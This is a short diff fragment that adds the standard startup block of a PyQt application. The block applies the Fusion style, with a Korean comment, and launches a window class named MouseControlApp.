+    app = QApplication(sys.argv)
+    app.setStyle('Fusion')  # 모던한 스타일 적용
+    ex = MouseControlApp()
+    ex.show()
+    sys.exit(app.exec_())
